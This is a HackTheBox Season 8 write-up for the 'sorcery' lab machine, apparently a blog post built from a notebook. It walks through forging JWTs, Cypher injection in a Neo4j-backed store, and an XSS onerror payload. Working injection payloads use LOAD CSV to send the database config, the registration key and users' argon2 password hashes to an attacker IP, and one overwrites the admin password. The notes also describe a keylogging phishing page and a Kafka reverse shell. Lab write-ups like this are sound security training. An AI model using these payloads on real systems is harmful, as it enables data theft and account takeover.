---
layout: post
title: "week 5 sorcery"
date: 2025-06-21 00:00:00 -0700
categories: challenges
description: A complex multi-service challenge exploiting database injection, XSS, and command injection to escalate privileges, exfiltrate sensitive data, and ultimately achieve root access through a series of chained AD vulnerabilities.
parent: HackTheBox - Season 8
grand_parent: Challenges
event: "htb-season-8"
tags:
- "web"
- "linux"
- "insane"
- "ssrf"
- "neo4j"
- "docker"
- "kafka"
- "phishing"
- "freeipa"
---
# week5-sorcery

## Engagement Notes

The initial foothold here is a very long chain with many services. The first step is to register and log into the main application. There's a link to a git repo near the login screen with all the infrastructure handily provided in a docker compose, along with all the source code for the custom apps. In there is a a few notable goals: An issue about backend database injection, the hostnames of every service running (via docker compose), and identifying a command injection ability in the dns service.

After logging into the service, a neo4j injection is available at the item ID in the store pages. Using this you can either dump the registration key to get access to make a seller, which itself has access to post items to the store. The admin of the site will visit this endpoint and the description of the item allows for html rendering for handy XSS. By forcing the admin to post to the enroll registration endpoint and passing back the passkey challenge, you can enroll the challenge to your own passkey manager and send another xss payload for the passkey registration so you can authenticate as admin with a passkey. Alternatively you can use the neo4j injection point to simply change the admin password to one of your own password hashes to login as admin.

Now it gets interesting. There's two endpoints available to admin, DNS and Debug. DNS doesn't do anything natively, however it's super useful to read off the "get" kafka topic. This will come in handy later to validate your payload injection mechanism. The Debug endpoint is required to get to the end of the foothold. 

Using the debug endpoint, you can send bytecode directly to a tcp endpoint. Using the docker-compose exfiltrated at the earlier step, you can now SSRF to any socket available to the backend server. One of the blog posts on the site advertises a recent phishing campaign with some requirements handily listed, hinting that the next step is to repeat the phishing campaign to a named victim.

I wrote a custom socket manager that used the authentication token of admin to simply post and parse through that endpoint to make all the payloads listed easier:

1) FTP byte encode an EPSV session to RETR the RootCA.key and .crt  
2) Use Github Copilot to rewrite the used Rust Kafka library in python so I can generate valid publishing bytecode to the "update" topic that is vulnerable to the command injection.  
3) Generate SMPT commands to the mail server, as well as consume the unauthenticated mailhog API to validate sending of mail.  

With the root cert, I used openssl to sign a cert for sorcery.htb. Then hosted a web server that phoned home for every keystroke on a login form that went nowhere. Then I used my kafka publisher code to create a record for a reverse shell which dumped me to the DNS container. Then I updated records and restarted dnsmasq. Finally I sent a phishing email to my victim with a link to my site. Here was the USER flag.

Luckily the root flag was much simpler in comparison: By watching processes on the machine, I found credentials in a cron job running to reset a user credential. That user had access to add users to a sysadmins group via ldapmodify or ipa. The sysadmin group had ability to modify a sudo permission group, which I used to add myself. With the new permissions I simply sudo su to root and grabbed the root flag.

There's many bugs in my custom tools that may or may not be fixed by the time you're reading this. Exact steps are in the following jupyter notebook output.

# Enumeration

### Set variables for further engagement


```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from pprint import pprint
from chepy import Chepy

source =! ip address | grep tun | grep 10 | tr "/" " " | awk '{print $2}'
public_source = requests.get('https://ifconfig.co/ip').text
target = 'sorcery.htb'
targetip = '10.129.42.101'

print(f"source: {source}")
print(f"target: {target}")
```

    source: ['10.10.14.31']
    target: sorcery.htb


### Port scan target


```python
!docker run -it --rm -v $(pwd):/app/target rustscan -a $target
```sh
    Nmap? More like slowmap.🐢
    
    [1;34m[~][0m The config file is expected to be at "/home/rustscan/.rustscan.toml"
    [1;31m[!][0m File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
    [1;31m[!][0m Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
    Open [35m10.129.42.101:22[0m
    Open [35m10.129.42.101:443[0m
    [1;34m[~][0m Starting Script(s)
    [1;34m[~][0m Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-15 10:41 UTC
    Initiating Ping Scan at 10:41
    Scanning 10.129.42.101 [2 ports]
    Completed Ping Scan at 10:41, 0.10s elapsed (1 total hosts)
    Initiating Parallel DNS resolution of 1 host. at 10:41
    Completed Parallel DNS resolution of 1 host. at 10:41, 0.01s elapsed
    DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 3, TR: 3, CN: 0]
    Initiating Connect Scan at 10:41
    Scanning 10.129.42.101 [2 ports]
    Discovered open port 22/tcp on 10.129.42.101
    Discovered open port 443/tcp on 10.129.42.101
    Completed Connect Scan at 10:41, 0.09s elapsed (2 total ports)
    Nmap scan report for 10.129.42.101
    Host is up, received conn-refused (0.095s latency).
    Scanned at 2025-06-15 10:41:53 UTC for 0s
    
    PORT    STATE SERVICE REASON
    22/tcp  open  ssh     syn-ack
    443/tcp open  https   syn-ack
    
    Read data files from: /usr/bin/../share/nmap
    Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
``` 


Here we find SSH and a web site. We'll take what we can get.

### URL scan target


```python
!gobuster dir -k -u https://$target -w $(wordlists_path)/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -x txt,js,html,php -t 40 -b 404
```

    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     https://sorcery.htb
    [+] Method:                  GET
    [+] Threads:                 40
    [+] Wordlist:                /nix/store/khjvbjjz3yazpgln3qb9nykyf4ypahcm-wordlists-collection/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Extensions:              txt,js,html,php
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    [2K/2006.php            [31m (Status: 503)[0m [Size: 197]
    [2K/crack.php           [31m (Status: 503)[0m [Size: 197]
    [2K/serial.html         [31m (Status: 503)[0m [Size: 197]
    [2K/crack.js            [31m (Status: 503)[0m [Size: 197]
    [2K/crack.html          [31m (Status: 503)[0m [Size: 197]
    [2K/index.html          [31m (Status: 503)[0m [Size: 197]
    [2K/serial.php          [31m (Status: 503)[0m [Size: 197]
    ...
    [2K/articles.html       [31m (Status: 503)[0m [Size: 197]
    [2K/articles.js         [31m (Status: 503)[0m [Size: 197]
    [2K/support             [31m (Status: 503)[0m [Size: 197]
    [2K/login.php           [31m (Status: 503)[0m [Size: 197]
    [2K/05.php              [31m (Status: 503)[0m [Size: 197]
    [2K/keygen.txt          [31m (Status: 503)[0m [Size: 197]
    ^C
    
    [!] Keyboard interrupt detected, terminating.
    [2KProgress: 321 / 408220 (0.08%)
    ===============================================================
    Finished
    ===============================================================


It's unclear if this was site instability or some protections, but any scanning results in a 503 gateway error, so I stop pretty quickly.


```python
!gobuster vhost -u https://$target --append-domain -w $(wordlists_path)/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 40 -k 
```

    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:             https://sorcery.htb
    [+] Method:          GET
    [+] Threads:         40
    [+] Wordlist:        /nix/store/khjvbjjz3yazpgln3qb9nykyf4ypahcm-wordlists-collection/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
    [+] User Agent:      gobuster/3.6
    [+] Timeout:         10s
    [+] Append Domain:   true
    ===============================================================
    Starting gobuster in VHOST enumeration mode
    ===============================================================
    [2K[32mFound[0m: git.sorcery.htb [32mStatus: 200[0m [Size: 13593]
    [2KProgress: 114441 / 114442 (100.00%)
    ===============================================================
    Finished
    ===============================================================


VHOST search finds what I will also find later in the login page. A gitea instance behind git.sorcery.htb.

# Reviewing Findings

Below are some notable service versions information and potentially helpful port identifiers. Most of the version information here doesn't prove to be useful, however the hostnames, services, environment variables, and some other information are all super helpful in navigating the environment.

```sh

https://git.sorcery.htb/nicole_sullivan/infrastructure/src/commit/acb753dd975a639f2dbc28ee8fd4d67adc50e609/docker-compose.yml#L74
    image: mailhog/mailhog:v1.0.1

https://git.sorcery.htb/nicole_sullivan/infrastructure/src/commit/acb753dd975a639f2dbc28ee8fd4d67adc50e609/docker-compose.yml#L78
    image: million12/vsftpd:cd94636
    environment:
      ANONYMOUS_ACCESS: true
      LOG_STDOUT: true

https://git.sorcery.htb/nicole_sullivan/infrastructure/src/commit/acb753dd975a639f2dbc28ee8fd4d67adc50e609/docker-compose.yml#L107
    healthcheck:
      test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/127.0.0.1/3000"]
      interval: 5s
      timeout: 10s
      retries: 5

https://git.sorcery.htb/nicole_sullivan/infrastructure/src/commit/acb753dd975a639f2dbc28ee8fd4d67adc50e609/backend/Dockerfile#L1
FROM lukemathwalker/cargo-chef:0.1.67-rust-bookworm AS chef

https://git.sorcery.htb/nicole_sullivan/infrastructure/src/commit/acb753dd975a639f2dbc28ee8fd4d67adc50e609/backend/Dockerfile#L26
FROM debian:bookworm-20240904 AS run

https://git.sorcery.htb/nicole_sullivan/infrastructure/src/commit/acb753dd975a639f2dbc28ee8fd4d67adc50e609/backend/Dockerfile#L29
COPY --from=ghcr.io/ufoscout/docker-compose-wait:latest /wait /wait

https://git.sorcery.htb/nicole_sullivan/infrastructure/src/branch/main/backend-macros/src/lib.rs

https://git.sorcery.htb/nicole_sullivan/infrastructure/src/commit/acb753dd975a639f2dbc28ee8fd4d67adc50e609/frontend/Dockerfile#L1
FROM node:22.6.0 AS base
```

While in the git repo, we also see the following issue for which we should keep an eye out:

> The backend was exposed to database statement injection. Most calls have already been replaced with safe ones. We have to do the same for the remaining ones.


In the blog posts for the main site, we see the following posts. This is probably a huge hint to attempt to phish someone to get credentials. I'm going to gamble that this is a very good use of time and start collecting the tools I need listed here to accomplish the goal. Specifically: Certificates in FTP, a site hosted as a sub domain, and the user tom_summers.

        "Hello, just making a quick summary of the phishing training we had last week. \
        Remember not to open any link in the email unless: \
        a) the link comes from one of our domains (<something>.sorcery.htb); \
        b) the website uses HTTPS; \
        c) the subdomain uses our root CA. (the private key is safely stored on our FTP server, so it can't be hacked). "

        "There has been a phishing campaign that used our Gitea instance. \
        All of our employees except one (looking at you, @tom_summers) have passed the test. \
        Unfortunately, Tom has entered their credentials, but our infosec team quickly revoked the access and changed the password. \
        Tom, make sure that doesn't happen again! Follow the rules in the other post!"

To clone the repo down locally for more searching, I had to add a http.sslVerify=false flag to clone.
```sh
git -c http.sslVerify=false  clone https://git.sorcery.htb/nicole_sullivan/infrastructure.git
```

Logging into the site, and reviewing the source code for the frontend: there are many endpoints that require passkey auth. I simply clicked the enroll button to add in bitwaren/keeper from my browser to give myself this access. These JWT verifications aren't done on the frontend, so we can simply forge our JWT with cyberchef to update this functionality, but all backend APIs DO check for a valid signature so this will not get very far on its own.


```python
import base64
from chepy import Chepy
from pprint import pprint
# Token from my registered "Client" user "tokugero"
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6ImRkZDZhYjIzLThlODktNDQ5Zi05MWZmLWNiZjcxNjViOGNmYiIsInVzZXJuYW1lIjoidG9rdWdlcm8iLCJwcml2aWxlZ2VMZXZlbCI6MCwid2l0aFBhc3NrZXkiOnRydWUsIm9ubHlGb3JQYXRocyI6bnVsbCwiZXhwIjoxNzUwMDQzNjI1fQ.wrGOFS-h1ab_r2xkWwdGMBPaAGTBLF91BtjNwI2UMC4"

pprint(Chepy(str(token)).jwt_decode().o)
```

    {'header': {'alg': 'HS256', 'typ': 'JWT'},
     'payload': {'exp': 1750043625,
                 'id': 'ddd6ab23-8e89-449f-91ff-cbf7165b8cfb',
                 'onlyForPaths': None,
                 'privilegeLevel': 0,
                 'username': 'tokugero',
                 'withPasskey': True}}



```python
# A function to forge my token into varying privilege levels in case this becomes useful later. (Hint, it doesn't)
def generate_tokens(token: str) -> {"admin_token": str, "seller_token": str, "client_token": str}:
    import json

    # Simply change the passkey validation to true for client user
    jwt = Chepy(str(token)).jwt_decode().o
    jwt["payload"]["withPasskey"] = True
    client_token = str(Chepy(jwt["payload"]).jwt_sign(secret=""))
    client_token = token

    # Now add privilege level 2 and set name to admin, as the source code for frontend shows 2 = admin. 
    jwt["payload"]["privilegeLevel"] = 2
    jwt["payload"]["username"] = "admin"
    admin_token = str(Chepy(jwt["payload"]).jwt_sign(secret=""))

    # Just in case this is useful, also make one for seller since it's there
    jwt["payload"]["privilegeLevel"] = 1
    jwt["payload"]["username"] = "tokugero"
    seller_token = str(Chepy(jwt["payload"]).jwt_sign(secret=""))

    # Return all 3 at once so I can pick and choose later.
    return {"admin_token": admin_token, "seller_token": seller_token, "client_token": client_token}

# This is just to show how this function works.
tokens = generate_tokens(token)
print("admin token")
print(tokens["admin_token"])
pprint(Chepy(str(tokens["admin_token"])).jwt_decode().o)

print("seller token")
print(tokens["seller_token"])
pprint(Chepy(str(tokens["seller_token"])).jwt_decode().o)

print("client token")
print(tokens["client_token"])
pprint(Chepy(str(tokens["client_token"])).jwt_decode().o)


```

    admin token
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjJkOWYwZDllLTA5MzUtNDlmMy1hZmNkLTI5YWJkMzQyNzAxMSIsInVzZXJuYW1lIjoiYWRtaW4iLCJwcml2aWxlZ2VMZXZlbCI6Miwid2l0aFBhc3NrZXkiOnRydWUsIm9ubHlGb3JQYXRocyI6bnVsbCwiZXhwIjoxNzUwNDQxMDY5fQ.i5QeraMKyCGyHHNxXbjTrolTiwpzDmDjbHfKBPbNLFA
    {'header': {'alg': 'HS256', 'typ': 'JWT'},
     'payload': {'exp': 1750441069,
                 'id': '2d9f0d9e-0935-49f3-afcd-29abd3427011',
                 'onlyForPaths': None,
                 'privilegeLevel': 2,
                 'username': 'admin',
                 'withPasskey': True}}
    seller token
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjJkOWYwZDllLTA5MzUtNDlmMy1hZmNkLTI5YWJkMzQyNzAxMSIsInVzZXJuYW1lIjoidG9rdWdlcm8iLCJwcml2aWxlZ2VMZXZlbCI6MSwid2l0aFBhc3NrZXkiOnRydWUsIm9ubHlGb3JQYXRocyI6bnVsbCwiZXhwIjoxNzUwNDQxMDY5fQ.g8ltL88PlzsyZk-eupqqsVz6dBXCDjRbcLhhG1FTJIk
    {'header': {'alg': 'HS256', 'typ': 'JWT'},
     'payload': {'exp': 1750441069,
                 'id': '2d9f0d9e-0935-49f3-afcd-29abd3427011',
                 'onlyForPaths': None,
                 'privilegeLevel': 1,
                 'username': 'tokugero',
                 'withPasskey': True}}
    client token
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjJkOWYwZDllLTA5MzUtNDlmMy1hZmNkLTI5YWJkMzQyNzAxMSIsInVzZXJuYW1lIjoiYWRtaW4iLCJwcml2aWxlZ2VMZXZlbCI6Miwid2l0aFBhc3NrZXkiOnRydWUsIm9ubHlGb3JQYXRocyI6bnVsbCwiZXhwIjoxNzUwNDQxMDY5fQ.bLH8AEcJUONzFZOugLao5lSiwfEzDUPQ9SJPaN-sz_M
    {'header': {'alg': 'HS256', 'typ': 'JWT'},
     'payload': {'exp': 1750441069,
                 'id': '2d9f0d9e-0935-49f3-afcd-29abd3427011',
                 'onlyForPaths': None,
                 'privilegeLevel': 2,
                 'username': 'admin',
                 'withPasskey': True}}


From the source code, there's a section for creating a new product via a post. I could have used this for the XSS but didn't because I'm lazy and inconsistent.


```python
import requests

def createProduct(session: requests.Session, token: str, name: str, description: str) -> (int, str):
    session = requests.Session()
    url = f"https://{target}/dashboard/new-product"

    json = [name, description]

    headers = {
        "Next-Action": "e43c0e68ecc317131dbfa2479dcbffc95b724cc4" # Each post has a unique "Next-Action" header. I will get this from the dev tools in firefox for each action I automate.
    }

    response = requests.post(url, headers=headers, json=json, verify=False)

    return response
    
# print(createProduct(generate_tokens(token)["seller_token"], "test", "description"))
```

Using the forged tokens, I can modify all my properites to LOOK like I'm an admin so I can see how the page might look and see if I can use any functionality from the backend. Hint: I cannot.

![alt text](../../../assets/images/ctf/events/season8-htb-25/2025-06-21-week5-sorcery.md/2025-06-21-week5-sorcery/image-3.png)

Hidden in backend-macros/src/lib.rs we can see of what the github issue spoke: A string with interpolated, user controlled, values. Namely the `#name` variable that is taken from any query to `get_by_xxx`. There's 2 in the repo, one for get_by_id (store items), and one for get_by_username. I did not find a way to customize the get_by_username payload as there's many filters to ensure alphanumeric values there. However in the item lookup URI there is no such limiation.

Source code for the derived functions of "get_by_xxx":
{% raw %}
```rust
    let get_functions = fields.iter().map(|&FieldWithAttributes { field, .. }| {
        let name = field.ident.as_ref().unwrap();
        let type_ = &field.ty;
        let name_string = name.to_string();
        let function_name = syn::Ident::new(
            &format!("get_by_{}", name_string),
            proc_macro2::Span::call_site(),
        );

        quote! {
            pub async fn #function_name(#name: #type_) -> Option<Self> {
                let graph = crate::db::connection::GRAPH.get().await;
                let query_string = format!(
                    r#"MATCH (result: {} {{ {}: "{}" }}) RETURN result"#,
                    #struct_name, #name_string, #name
                );
                let row = match graph.execute(
                    ::neo4rs::query(&query_string)
                ).await.unwrap().next().await {
                    Ok(Some(row)) => row,
                    _ => return None
                };
                Self::from_row(row).await
            }
        }
```
{% endraw %}

Example result searching for `get_by_`:
backend/src/api/auth

```rust
#[post("/login", data = "<data>")]
pub async fn login<'r>(
    data: Validated<Json<Request<'r>>>,
    cookies: &CookieJar<'_>,
) -> Result<Json<Response>, AppError> {
    let Request { username, password } = data.into_inner().into_inner();

    let user = match User::get_by_username(username.to_owned()).await {
        Some(user) => user,
        None => return Err(AppError::NotFound),
    };
```


```python
# Attempt to inject user field
def login(session: requests.Session, username: str, password:str) -> str:
    login_url = f"https://{target}/auth/login"

    session = requests.Session()

    payload = [username, password]

    headers = {
        "Next-Action": "7abc1d84ff816e8d6965b2132e8011685a8c9917",  # hardcoded for the login function
    }

    login = session.post(login_url, headers=headers, json=payload, verify=False)

    print(login.request.body)

    return login.text.split("\n")[1].split('"')[5]

with requests.Session() as s:
    print(login(s, "tokugero","tokugero"))
```

```log
    b'["tokugero", "tokugero"]'
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjlkNTQ4ZjQyLTk3YWUtNDA3MC05MDlhLThjOTU4OThjMDgzNCIsInVzZXJuYW1lIjoidG9rdWdlcm8iLCJwcml2aWxlZ2VMZXZlbCI6MCwid2l0aFBhc3NrZXkiOmZhbHNlLCJvbmx5Rm9yUGF0aHMiOm51bGwsImV4cCI6MTc1MDQ3OTE3OX0.28vyPBNdsMQb5dIRLritMDzip8zdpHHjLVqoDX9HXqs
```

When encountering this suspected weakness, I had to do a bit of research to reacquaint myself with the technique.

* [Cypher Injection Cheatsheet](https://pentester.land/blog/cypher-injection-cheatsheet/)
* [Youtube cypher TLDR](https://www.youtube.com/watch?v=SIqKo7xiPVA)

The gist of the vulnerability is as such:
{% raw %}
```rust
let query_string = format!( // format the following string with N number of varialbes as defined by {}
    //         more vars----v-----v
    r#"MATCH (result: {} {{ {}: "{}" }}) RETURN result"#,
    //       variables^   ^these are double to behave as escapes
    #struct_name, #name_string, #name // The variables that will be injected in the above string
);
```
{% endraw %}

The final string will look as such:  
`MATCH (result: #struct_name {#name_string: "#name"}) RETURN result`

And following the rest of the source code for a function called `get_by_id` for a `product` class type we have:  
`MATCH (result: id {product: USERINPUTHERE}) RETURN result`

So just like our sql injection counterparts we want to do something like:  
`MATCH {result: id {product: "valid-id"}) MORE QUERIES HERE LOL DONT KEEP LOOKING PLZ //"}) RETURN result`  
where our input is `valid-id"}) MORE QUERIES HERE LOL DONT KEEP LOOKING PLZ //`


```python
from urllib.parse import quote 
import requests

userpayload = 'x%22}) RETURN 1 UNION CALL apoc.util.sleep(10000) RETURN 1/'
#                              '}) OR 1=1 RETURN u/*
# "MATCH (result: {} \{\{ \{}: "{}" }}) RETURN result"

with requests.Session() as s:
    print(login(s, userpayload, "tokugero"))

{% raw %}
```
    b'["x%22}) RETURN 1 UNION CALL apoc.util.sleep(10000) RETURN 1/", "tokugero"]'
    invalid username
```
{% endraw %}

Ultimately the user injection didn't pan out. There wasn't a way I was able to pass the payload through the filters.


```python
import requests

# A function to view products based on ID. i'll use this to try injection payloads at this point.
def viewProduct(session: requests.Session, token: str, id: str) -> str:
    url = f"https://{target}/dashboard/store"
    session.cookies.set("token", token, domain=target)

    response = session.get(f"{url}/{id}", verify=False)

    return response
    
```

Here I spent a lot of time. I left some examples of payloads to show what they did.


```python
from urllib.parse import quote, quote_plus
# 200 when found, 404 when not found, 500 on server error
payload = '88b6b6c5-a614-486c-9d51-d255f47efb4f' # throws 200
# payload = '88b6b6c5-a614-486c-9d51-d255f47efb4a' # should throw a 200 with a 404 on the page but doesn't
# payload = "x\"}) RETURN '88b6b6c5-a614-486c-9d51-d255f47efb4f' AS result//" # throws 404
# payload = "x\"}) RETURN '88b6b6c5-a614-486c-9d51-d255f47efb4f' AS result#" # throws 500
# payload = 'x"}) RETURN {id: "88b6b6c5-a614-486c-9d51-d255f47efb4f", name: "foo", description: "bar"} AS result'
# payload = 'a5015425-e4ad-425b-a8c9-8bb8d84c9e67"}) RETURN {id: "a5015425-e4ad-425b-a8c9-8bb8d84c9e67", name: "foo", description: "bar"} AS result#'

with requests.Session() as s:
    product_token = login(s, "tokugero","tokugero")
    gen_product_token = generate_tokens(product_token)
    response = viewProduct(s, gen_product_token["client_token"], payload)
    print(response.status_code)

```
```log
    b'["tokugero", "tokugero"]'
    200
```


```python
# Generate a new item
with requests.Session() as s:
    product_token = login(s, "tokugero","tokugero")
    product_token_fetch = generate_tokens(product_token)
    print(product_token_fetch["client_token"])
    createProductResponse = createProduct(s, product_token_fetch["client_token"], "test", "test")
    print(createProductResponse.status_code)
    print(createProductResponse.url)
    print(createProductResponse.headers)
    pprint(createProductResponse.text)
```
```log
    b'["tokugero", "tokugero"]'
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjlkNTQ4ZjQyLTk3YWUtNDA3MC05MDlhLThjOTU4OThjMDgzNCIsInVzZXJuYW1lIjoidG9rdWdlcm8iLCJwcml2aWxlZ2VMZXZlbCI6MCwid2l0aFBhc3NrZXkiOmZhbHNlLCJvbmx5Rm9yUGF0aHMiOm51bGwsImV4cCI6MTc1MDQ4MDE3OX0.5B66-IIujFO7Wu7iBsSzErw5f4RBG_RXN-yLWXsFMH0
    200
    https://sorcery.htb/dashboard/new-product
    {'Server': 'nginx/1.27.1', 'Date': 'Fri, 20 Jun 2025 04:29:40 GMT', 'Content-Type': 'text/x-component', 'Transfer-Encoding': 'chunked', 'Connection': 'keep-alive', 'Vary': 'RSC, Next-Router-State-Tree, Next-Router-Prefetch, Accept-Encoding', 'Cache-Control': 'no-cache, no-store, max-age=0, must-revalidate', 'x-action-revalidated': '[[],0,0]', 'X-Powered-By': 'Next.js', 'Content-Encoding': 'gzip'}
    ('0:["$@1",["eMXTkHuLPViqV0QpNTSCV",null]]\n'
     '1:{"error":{"error":"401 Unauthorized"}}\n')
```

After some trial and error, we find the following payload can phone home. And even better, if we serve a file from home, we can have it get called again for each value in my local file!

`https://sorcery.htb/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f"}) LOAD CSV FROM "http:%2f%2f10.10.14.26:4444%2f"+"hello" AS fuck RETURN fuck%2f%2f`
```sh
 echo "hello" >> test.csv
```

`https://sorcery.htb/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f"}) LOAD CSV FROM "http:%2f%2f10.10.14.26:4444%2ftest.csv" AS payload LOAD CSV FROM "http:%2f%2f10.10.14.26:4444%2f"+payload[0] AS fuck RETURN fuck%2f%2f`

```log
172.26.0.6 - - [16/Jun/2025 01:33:01] "GET /test.csv HTTP/1.1" 200 -
172.26.0.6 - - [16/Jun/2025 01:33:01] code 404, message File not found
172.26.0.6 - - [16/Jun/2025 01:33:01] "GET /hello HTTP/1.1" 404 -
```

After much trial and error with the payload syntax, I found that this specific line got a dump of the db config back to me.


```python
payload = '88b6b6c5-a614-486c-9d51-d255f47efb4f"}) WITH 1 as a MATCH (f:Config) UNWIND keys(f) as p LOAD CSV FROM "http://10.10.14.31:4444/?"+p+"="+toString(f[p]) as l RETURN 0//'
escaped_payload = quote(payload, safe='')

with requests.Session() as s:
    product_token = login(s, "tokugero","tokugero")
    response = viewProduct(s, generate_tokens(product_token)["client_token"], escaped_payload)
    print(response.url)
    print(response.status_code)
```
```log
    b'["tokugero", "tokugero"]'
    https://sorcery.htb/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7D%29%20WITH%201%20as%20a%20MATCH%20%28f%3AConfig%29%20UNWIND%20keys%28f%29%20as%20p%20LOAD%20CSV%20FROM%20%22http%3A%2F%2F10.10.14.31%3A4444%2F%3F%22%2Bp%2B%22%3D%22%2BtoString%28f%5Bp%5D%29%20as%20l%20RETURN%200%2F%2F
    500
```

```sh
10.129.42.101 - - [16/Jun/2025 02:44:12] "GET /?registration_key=dd05d743-b560-45dc-9a09-43ab18c7a513 HTTP/1.1" 200 -
10.129.42.101 - - [16/Jun/2025 02:44:12] "GET /?is_initialized=true HTTP/1.1" 200 -
```

And with this I can get back the users and password hashes.

```python
payload = '88b6b6c5-a614-486c-9d51-d255f47efb4f"}) WITH 1 as a MATCH (f:User) UNWIND keys(f) as p LOAD CSV FROM "http://10.10.14.31:4444/?"+p+"="+toString(f[p]) as l RETURN 0//'
escaped_payload = quote(payload, safe='')

with requests.Session() as s:
    product_token = login(s, "tokugero","tokugero")
    response = viewProduct(s, generate_tokens(product_token)["client_token"], escaped_payload)
    print(response.url)
    print(response.status_code)
```
```log
    b'["tokugero", "tokugero"]'
    https://sorcery.htb/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7D%29%20WITH%201%20as%20a%20MATCH%20%28f%3AUser%29%20UNWIND%20keys%28f%29%20as%20p%20LOAD%20CSV%20FROM%20%22http%3A%2F%2F10.10.14.31%3A4444%2F%3F%22%2Bp%2B%22%3D%22%2BtoString%28f%5Bp%5D%29%20as%20l%20RETURN%200%2F%2F
    500
```
```log

10.129.89.63 - - [16/Jun/2025 21:00:09] "GET /?id=2d9f0d9e-0935-49f3-afcd-29abd3427011 HTTP/1.1" 200 -
10.129.89.63 - - [16/Jun/2025 21:00:09] "GET /?password=$argon2id$v=19$m=19456,t=2,p=1$T+K9waOashQqEOcDljfe5Q$X5Yul0HakDZrbkEDxnfn2KYJv/BdaFsXn7xNwS1ab8E HTTP/1.1" 200 -
10.129.89.63 - - [16/Jun/2025 21:00:10] "GET /?username=admin HTTP/1.1" 200 -
10.129.89.63 - - [16/Jun/2025 21:00:10] "GET /?id=74c3b03b-789d-429e-87ed-ede260f6200a HTTP/1.1" 200 -
10.129.89.63 - - [16/Jun/2025 21:00:10] "GET /?password=$argon2id$v=19$m=19456,t=2,p=1$1xziFyP44PyfP8sqTCEQ8A$gywo92uCWcIz02LmgbtNu2TCMpD5Ml9x4BFpGPn8nlc HTTP/1.1" 200 -
10.129.89.63 - - [16/Jun/2025 21:00:10] "GET /?username=tokugero HTTP/1.1" 200 -
10.129.89.63 - - [16/Jun/2025 21:00:11] "GET /?id=59b78ed7-8ac3-4bda-87d1-52c42d8662f9 HTTP/1.1" 200 -
10.129.89.63 - - [16/Jun/2025 21:00:11] "GET /?password=$argon2id$v=19$m=19456,t=2,p=1$VJxpFhWfKtUrRa9uREMGLg$PMqSK4BO38mG/lj0JYgkDSkgGRaBTGZ9YNBU7sPKKlM HTTP/1.1" 200 -
10.129.89.63 - - [16/Jun/2025 21:00:11] "GET /?username=tokugero5 HTTP/1.1" 200 -
```
And finally, the easy mode access:


```python
payload = '88b6b6c5-a614-486c-9d51-d255f47efb4f"}) WITH 1 as a match (u:User {username: "admin"}) set u.password = "$argon2id$v=19$m=19456,t=2,p=1$VJxpFhWfKtUrRa9uREMGLg$PMqSK4BO38mG/lj0JYgkDSkgGRaBTGZ9YNBU7sPKKlM" RETURN u//'
escaped_payload = quote(payload, safe='')

with requests.Session() as s:
    product_token = login(s, "tokugero","tokugero")
    response = viewProduct(s, generate_tokens(product_token)["client_token"], escaped_payload)
    print(response.url)
    print(response.status_code)
```

    b'["tokugero", "tokugero"]'
    https://sorcery.htb/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7D%29%20WITH%201%20as%20a%20match%20%28u%3AUser%20%7Busername%3A%20%22admin%22%7D%29%20set%20u.password%20%3D%20%22%24argon2id%24v%3D19%24m%3D19456%2Ct%3D2%2Cp%3D1%24VJxpFhWfKtUrRa9uREMGLg%24PMqSK4BO38mG%2Flj0JYgkDSkgGRaBTGZ9YNBU7sPKKlM%22%20RETURN%20u%2F%2F
    500


![alt text](../../../assets/images/ctf/events/season8-htb-25/2025-06-21-week5-sorcery.md/2025-06-21-week5-sorcery/image-2.png)

It doesn't look like much here, but I assure you this is actual admin without forged JWT.

### Intended? Passkey Registration

This section isn't as useful to someone just trying to get flags, but it was a very useful learning exercise and I believe this was the intended solution.

Note this is a mix of vibe coding, and mostly browser based usage, so not as much code to copy around. Since the other method was simpler, that's the way I kept accessing the site and thus codified it.

As a good user, once I had the registration token from the earlier dump, I registered a seller accoutn and clicked the only new button to see where I could drop templating things. The only field I found vulnerable to this was the description of the new item creation.

![alt text](../../../assets/images/ctf/events/season8-htb-25/2025-06-21-week5-sorcery.md/2025-06-21-week5-sorcery/image-1.png)

```html
<img src/onerror=fetch('http://10.10.14.26:4444/?'+document.location.href)>
```

Note the return from the target showing from where the site was accessed.
```log
10.129.42.101 - - [16/Jun/2025 03:15:23] "GET /?http://frontend:3000/dashboard/store/d1b9d5fc-7b6d-473f-b4f3-4c7a19fe115a HTTP/1.1" 200 -
```

